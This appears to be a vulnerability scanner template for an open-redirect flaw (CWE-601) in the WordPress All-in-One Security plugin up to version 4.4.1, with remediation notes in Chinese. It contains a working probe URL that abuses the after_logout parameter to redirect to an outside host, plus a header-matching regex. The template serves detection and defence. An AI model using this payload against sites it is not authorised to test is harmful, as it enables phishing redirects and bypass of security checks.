id: wp-security-open-redirect

info:
  name: WordPress All-in-One Security <=4.4.1 - 开放重定向漏洞
  author: akincibor
  severity: medium
  description: WordPress All-in-One Security <=4.4.1 - 开放重定向 存在开放重定向漏洞。攻击者可构造恶意跳转链接诱导用户访问钓鱼站点，或配合其他业务流程绕过安全校验。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Upgrade to 4。
    - 对跳转目标实施白名单校验，避免直接信任用户可控的 URL 参数。
    - 对登录、回调和重定向相关流程增加来源校验与业务约束。
  reference:
    - https://wpscan.com/vulnerability/9898
    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-all-in-one-wp-security-firewall-open-redirect-4-4-1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
  metadata:
    verified: true
    max-request: 1
  tags: wp-plugin,redirect,wordpress,wp,wpscan,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?aiowpsec_do_log_out=1&after_logout=https://interact.sh"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$' # https://regex101.com/r/L403F0/1
